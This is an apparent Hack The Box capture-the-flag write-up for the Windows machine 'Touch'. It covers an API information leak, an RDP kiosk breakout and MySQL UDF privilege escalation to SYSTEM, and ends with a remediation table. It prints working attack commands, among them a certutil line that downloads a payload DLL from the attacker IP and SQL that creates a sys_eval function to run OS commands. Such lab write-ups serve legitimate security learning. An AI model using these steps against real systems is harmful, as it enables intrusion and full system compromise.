# 📦 Hack The Box: Touch

<div align="center">
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Points-20-orange?style=for-the-badge" />
  <br/><br/>
  <strong>Author:</strong> Fayozbek Iskandarov (@secfz) | 
  <strong>Date:</strong> October 04, 2026 | 
  <strong>Rank:</strong> HTB Grandmaster
</div>

> ⚠️ **Disclaimer:** This write-up is for educational purposes only. All activities described were performed in an authorized, isolated Hack The Box laboratory environment.

---

## 📌 Machine Information

| Parameter | Value |
| :--- | :--- |
| **Machine Name** | Touch |
| **Operating System** | Windows 11 / Server 2025 |
| **Target IP** | `10.129.11.9` |
| **Attacker IP** | `10.10.14.25` |
| **Attack Chain** | Info Disclosure ➔ Kiosk Breakout ➔ Hardcoded Creds ➔ MySQL UDF PrivEsc |

---

## 🔍 1. Reconnaissance

Initial enumeration was performed using `nmap` to identify open ports and running services:

```bash
nmap -p- -sV -sC -Pn 10.129.11.9

Key Findings:
Port 135 (RPC): Microsoft Windows RPC
Port 3389 (RDP): Microsoft Terminal Services
Port 5985 (WinRM): Microsoft HTTPAPI httpd
Port 8443 (HTTPS): Microsoft HTTPAPI (Custom DeviceHub Application)
The custom web application on port 8443 became the primary attack vector.
  
🚪 2. Initial Foothold
  
2.1. Information Disclosure via API

Enumerating the web application revealed an unauthenticated endpoint /api/status that leaked sensitive device information:

curl -k https://10.129.11.9:8443/api/status

Response:

{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 51116
}

2.2. Admin Panel Access & Credential Harvesting
  
Navigating to https://10.129.11.9:8443 presented a login panel. Using the leaked serial number (NX-DH-2024-B7042) as the password granted successful authentication.
  
Inside the Dashboard, RDP credentials were exposed in plaintext:

Username: KioskUser
Password: K!0sk2026#
  
2.3. Kiosk Breakout (Logic Flaw)

Connected to the machine via RDP using the harvested credentials:

xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.11.9 /size:1280x800 /dynamic-resolution

The session launched a restricted HTB Airways Kiosk application. To escape this environment, a logical flaw was exploited:

1. Accessed the DeviceHub admin panel (:8443) from within the kiosk browser.
2. Navigated to Settings and intentionally powered "Off" the virtual Scanner device.
3. Clicked "Return to Kiosk".
4. Because the scanner was offline, the kiosk application threw a Win32 Error dialog.
5. Clicked the blue hyperlink within the error message, which spawned an unrestricted Microsoft Edge browser.
6. Pressed Ctrl + O in Edge to open the "Open File" dialog.
7. Typed cmd.exe in the file path and pressed Enter, successfully spawning a standard Command Prompt.
  
2.4. User Flag

With unrestricted shell access as KioskUser, the user flag was retrieved:

type C:\Users\KioskUser\Desktop\user.txt

👑 3. Privilege Escalation
  
3.1. Discovering Hardcoded Credentials

While enumerating the file system for misconfigurations, a batch script was discovered in the ProgramData directory:

type "C:\ProgramData\HTB Airways\refresh-dates.bat"

The script contained hardcoded credentials for the local MySQL database:

Username: root
Password: HTB@irw4ys_DB!2026
  
3.2. Identifying the Attack Vector (MySQL UDF)

Further enumeration revealed that the MySQL 8.0 service was running under the NT AUTHORITY\SYSTEM context. Critically, the plugin directory had weak permissions, allowing the Authenticated Users group to write files:

icacls C:\MySQL\lib\plugin\

This misconfiguration allows for a User-Defined Function (UDF) exploitation to execute OS-level commands as SYSTEM.
  
3.3. Exploitation Steps

Step 1: Host the payload on the attacker machine (Kali Linux)

cd /usr/share/metasploit-framework/data/exploits/mysql
python3 -m http.server 8000

Step 2: Download the UDF DLL to the target

certutil -urlcache -f http://10.10.14.25:8000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll

Step 3: Execute the UDF Exploit via MySQL CLI
Logged into the database using the hardcoded credentials:

C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026

Dropped any existing function and created a new sys_eval function linked to the uploaded DLL:

DROP FUNCTION IF EXISTS sys_eval;
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';

3.4. SYSTEM Access & Root Flag

Verified the execution context and retrieved the root flag directly through the SQL console (using utf8mb4 conversion to prevent character encoding issues):

-- Verify SYSTEM privileges
SELECT CONVERT(sys_eval('whoami') USING utf8mb4) AS account;

-- Retrieve Root Flag
SELECT CONVERT(sys_eval('type C:\Users\Administrator\Desktop\root.txt') USING utf8mb4) AS root_flag;

🛡️ 4. Key Takeaways & Remediation

This machine beautifully demonstrated a chained attack vector relying on multiple minor misconfigurations:

## 🛡️ Key Takeaways & Remediation

This machine beautifully demonstrated a chained attack vector relying on multiple minor misconfigurations:

| Vulnerability | Impact | Remediation |
| :--- | :--- | :--- |
| **Information Disclosure** | Leaked serial number used for auth bypass. | Implement proper authentication/authorization checks on all API endpoints. |
| **Hardcoded Credentials** | Plaintext passwords in web UI and `.bat` files. | Use secure secret management. Never store passwords in plaintext scripts. |
| **Logic Flaw (Kiosk Breakout)** | Escaping restricted user environment. | Implement AppLocker/WDAC to restrict executable spawning from unexpected parent processes. |
| **Misconfigured Permissions** | Writable MySQL plugin directory leading to SYSTEM execution. | Apply the Principle of Least Privilege (PoLP). Restrict write access to service binary directories. |


<div align="center">
<em>Massive thanks to the HTB community and the machine creator for this highly realistic and engaging challenge!</em><br/><br/>
🔗 <a href="https://github.com/secfz">github.com/secfz</a> &nbsp;|&nbsp;
✈️ <a href="https://t.me/Secfz">Telegram: @Secfz</a> &nbsp;|&nbsp;
💼 <a href="https://www.linkedin.com/in/iskandarov-fayozbek">LinkedIn</a>
</div>























